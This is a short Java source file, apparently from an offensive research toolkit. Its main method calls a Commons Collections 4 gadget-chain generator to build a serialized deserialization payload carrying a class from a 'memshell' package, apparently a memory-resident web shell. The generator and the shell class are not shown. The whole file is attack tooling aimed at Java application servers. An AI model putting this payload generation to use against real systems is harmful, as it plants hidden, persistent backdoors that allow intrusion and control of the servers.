package com.demo.utils;

import com.demo.memshell.*;
import org.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class Ser {
    public static void main(String[] args) throws Exception{
        CC4Generator cc4Generator = new CC4Generator();
        cc4Generator.make(TFMSJMX.class);
    }
}
